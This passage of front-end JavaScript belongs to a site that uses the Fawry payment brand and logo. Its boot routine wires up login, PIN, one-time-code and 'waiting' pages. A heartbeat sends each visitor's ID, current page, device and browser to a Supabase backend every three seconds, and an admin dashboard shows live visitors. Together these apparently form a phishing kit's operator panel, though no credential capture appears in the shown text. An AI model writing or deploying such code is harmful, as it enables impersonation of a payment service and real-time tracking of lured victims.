      l.setAttribute("href", "./assets/images/fawry-logo-transparent.png");
    }
  }

  // ---------- إنترو سبلاش (مثل الموقع الأصلي: مرة واحدة في الجلسة) ----------
  var INTRO_KEY = "myfawry-intro-shown";
  function initIntro() {
    var shown = null;
    try { shown = sessionStorage.getItem(INTRO_KEY); } catch (e) {}
    if (shown) return;
    try { sessionStorage.setItem(INTRO_KEY, "1"); } catch (e) {}

    var intro = document.createElement("div");
    intro.setAttribute("aria-live", "polite");
    intro.setAttribute("aria-busy", "true");
    intro.style.cssText = "position:fixed;inset:0;z-index:100;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#ffde00;transition:opacity .7s ease-out;opacity:1;";
    intro.innerHTML =
      '<div class="relative flex flex-col items-center gap-6 px-6">' +
        '<div class="relative">' +
          '<div class="absolute inset-0 rounded-full bg-primary/10 animate-intro-ring"></div>' +
          '<div class="absolute inset-0 rounded-full bg-primary/10 animate-intro-ring delay-500"></div>' +
          '<img src="./assets/images/fawry-logo-transparent.png" alt="ماي فوري" class="relative w-52 h-auto object-contain animate-intro-logo drop-shadow-xl" width="220" height="220" draggable="false">' +
        '</div>' +
        '<div class="text-center space-y-2">' +
          '<h1 class="text-2xl font-extrabold text-[#00567e] tracking-wide animate-intro-fade" dir="ltr">my fawry</h1>' +
          '<p class="text-sm font-medium text-[#00567e]/70 animate-intro-fade delay-200">ساعات فاخرة بلمسة ملكية</p>' +
        '</div>' +
        '<div class="flex items-center gap-2 mt-2 animate-intro-fade delay-300">' +
          '<span class="h-2 w-2 rounded-full bg-primary animate-intro-dot"></span>' +
          '<span class="h-2 w-2 rounded-full bg-primary animate-intro-dot delay-150"></span>' +
          '<span class="h-2 w-2 rounded-full bg-primary animate-intro-dot delay-300"></span>' +
        '</div>' +
      '</div>';
    document.body.appendChild(intro);
    document.body.style.overflow = "hidden";

    setTimeout(function () {
      intro.setAttribute("aria-busy", "false");
      intro.style.opacity = "0";
      intro.style.pointerEvents = "none";
    }, 3400);
    setTimeout(function () {
      if (intro.parentNode) intro.parentNode.removeChild(intro);
      document.body.style.overflow = "";
    }, 4000);
  }

  // ---------- شاشة "جاري التحميل..." عند التنقل بين الصفحات ----------
  var busyTimer = null;
  function showBusy() {
    if (busyTimer) return;
    busyTimer = setTimeout(function () {
      busyTimer = null;
      var o = document.getElementById("fw-busy");
      if (o) return;
      o = document.createElement("div");
      o.id = "fw-busy";
      o.setAttribute("aria-live", "polite");
      o.setAttribute("aria-busy", "true");
      o.className = "fixed inset-0 z-[9999] flex flex-col items-center justify-center bg-background/95 backdrop-blur-sm transition-opacity duration-200";
      o.innerHTML = '<div class="relative flex items-center justify-center">' +
        '<div class="absolute h-24 w-24 animate-ping rounded-full bg-primary/20"></div>' +
        '<div class="absolute h-16 w-16 animate-pulse rounded-full bg-primary/30"></div>' +
        '<div class="relative h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>' +
      '</div><p class="mt-6 text-lg font-semibold text-foreground">جاري التحميل...</p>';
      document.body.appendChild(o);
    }, 250);
  }
  function hideBusy() {
    if (busyTimer) { clearTimeout(busyTimer); busyTimer = null; }
    var o = document.getElementById("fw-busy");
    if (o) { o.style.opacity = "0"; setTimeout(function () { if (o.parentNode) o.parentNode.removeChild(o); }, 250); }
  }
  function initBusy() {
    document.addEventListener("click", function (e) {
      if (e.defaultPrevented || e.button !== 0 || e.metaKey || e.ctrlKey || e.shiftKey || e.altKey) return;
      var a = e.target && e.target.closest ? e.target.closest("a[href]") : null;
      if (!a) return;
      var href = a.getAttribute("href") || "";
      if (!/^\.?\/?[a-z-]+\.html/i.test(href) && href.charAt(0) !== "#") return;
      if (href.charAt(0) === "#") return;
      showBusy();
    });
    window.addEventListener("pageshow", function (ev) { if (ev.persisted) hideBusy(); });
    window.addEventListener("beforeunload", function () { busyTimer && clearTimeout(busyTimer); busyTimer = null; });
  }

  // ---------- نبضة الزائر (سوپابيز — شغالة عبر كل الأجهزة واللينكات) ----------
  var K_VISIT_ID = "fawry_visitor_id_v1";
  var VIS_URL = "https://fdwfqskqljpgnlnbmjlc.supabase.co";
  var VIS_KEY = "sb_publishable_JNjKDtSaoIIJIJDomDrUug_h07D_K17";
  var VIS_TABLE = "visitors";
  function detectOS() {
    var ua = navigator.userAgent;
    if (/iPhone/i.test(ua)) return "iPhone/iPad";
    if (/Android/i.test(ua)) return "Android";
    if (/Mac OS X/i.test(ua)) return "Mac";
    if (/Windows/i.test(ua)) return "Windows";
    if (/Linux/i.test(ua)) return "Linux";
    return "جهاز آخر";
  }
  function detectBrowser() {
    var ua = navigator.userAgent;
    if (/Edg\//.test(ua)) return "Edge";
    if (/OPR\//.test(ua)) return "Opera";
    if (/Firefox\//.test(ua)) return "Firefox";
    if (/Chrome\//.test(ua)) return "Chrome";
    if (/Safari\/|Mobile Safari/.test(ua)) return "Safari";
    return "متصفح";
  }
  var visCache = []; // للداشبورد
  function visHeaders(extra) {
    var h = {
      "apikey": VIS_KEY,
      "authorization": "Bearer " + VIS_KEY,
      "Content-Type": "application/json"
    };
    if (extra) for (var k in extra) h[k] = extra[k];
    return h;
  }
  function getVisitorId() {
    var id = null;
    try { id = localStorage.getItem(K_VISIT_ID); } catch (e) {}
    if (!id) {
      id = "V-" + Math.random().toString(36).slice(2, 8).toUpperCase() + "-" + Date.now().toString(36).toUpperCase();
      try { localStorage.setItem(K_VISIT_ID, id); } catch (e) {}
    }
    return id;
  }
  function visLoc() { return location.pathname.split("/").pop() || "index.html"; }
  function visPing() {
    var row = {
      id: getVisitorId(),
      path: visLoc(),
      last_seen: new Date().toISOString(),
      device: detectOS(),
      browser: detectBrowser()
    };
    return fetch(VIS_URL + "/rest/v1/" + VIS_TABLE + "?on_conflict=id", {
      method: "POST",
      headers: visHeaders({ "Prefer": "resolution=merge-duplicates,return=minimal" }),
      body: JSON.stringify(row)
    }).catch(function () {});
  }
  function visFetch() {
    return fetch(VIS_URL + "/rest/v1/" + VIS_TABLE + "?select=*&order=last_seen.desc&limit=100", {
      headers: visHeaders()
    }).then(function (r) { return r.ok ? r.json() : []; }).then(function (rows) {
      if (!Array.isArray(rows)) return;
      var cutoff = Date.now() - 15000; // "خرج" أسرع: النبضة كل 3 ثواني — 15 ثانية من غير نبضة يعتبر خرج
      visCache = rows.map(function (r) {
        return {
          id: r.id,
          path: r.path || "/",
          ts: new Date(r.last_seen).getTime() || Date.now(),
          device: r.device || "جهاز آخر",
          browser: r.browser || "متصفح"
        };
      }).filter(function (v) { return v.ts >= cutoff; });
    }).catch(function () {});
  }
  function initHeartbeat(onlyList) {
    if (!onlyList) visPing();
    visFetch();
    setInterval(function () {
      if (!onlyList) visPing();
      visFetch();
    }, 3000);
    if (!onlyList) {
      window.addEventListener("beforeunload", function () {
        try {
          // نسيب الأثر على السيرفر — نرجّع النبضة 60 ثانية للوراء (بره نافذة 90 ثانية قريبًا)
          fetch(VIS_URL + "/rest/v1/" + VIS_TABLE + "?id=eq." + encodeURIComponent(getVisitorId()), {
            method: "PATCH",
            headers: visHeaders({ "Prefer": "return=minimal" }),
            body: JSON.stringify({ last_seen: new Date(Date.now() - 20000).toISOString() }),
            keepalive: true
          }).catch(function () {});
        } catch (e) {}
      });
    }
    // الواجهة للداشبورد (سجل متزامن — بيحدَّث تلقائيًا بالحلقة فوق)
    if (!window.FW_VISITORS) {
      window.FW_VISITORS = {
        list: function () { return visCache.slice(); }
      };
    }
  }

  // ---------- شريط "الموقع مغلق مؤقتاً" (من زر الطاقة في الداشبورد) ----------
  function initSiteClosed() {
    try {
      if (document.querySelector("[data-page='admin']") || document.getElementById("adm-app")) return;
      if (localStorage.getItem("fawry_site_closed") !== "1") return;
      var bar = document.createElement("div");
      bar.className = "fixed top-0 inset-x-0 z-[1000] bg-[#b91c1c] text-white text-[13px] font-extrabold text-center py-2 shadow-lg";
      bar.innerHTML = 'الموقع مغلق مؤقتًا للصيانة — عاود اتصل بعد شوية 🙏';
      document.body.appendChild(bar);
    } catch (e) {}
  }

  function boot() {
    fixFavicon();
    initBusy();
    initIntro();
    // الزوار: صفحة الإدارة بتسحب القايمة بس — باقي الصفحات بتبعت نبضة
    var isAdmin = !!document.querySelector("[data-page='admin']") || !!document.getElementById("adm-app");
    initHeartbeat(isAdmin);
    initSiteClosed();
    var pageRoot = document.querySelector("[data-page]");
    if (!pageRoot) return;
    var page = pageRoot.getAttribute("data-page");
    bindAddToCart();
    badge();
    if (page === "product") initProduct(pageRoot);
    if (page === "order") initOrder();
    if (page === "login-app") initLoginApp();
    if (page === "waiting-app") initWaiting();
    if (page === "pin") initPinApp();
    if (page === "code") initCode();
    if (page === "index" || page === "watches" || page === "product") {
      initFilters();
      initMobileMenu();
    }
  }

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();
})();
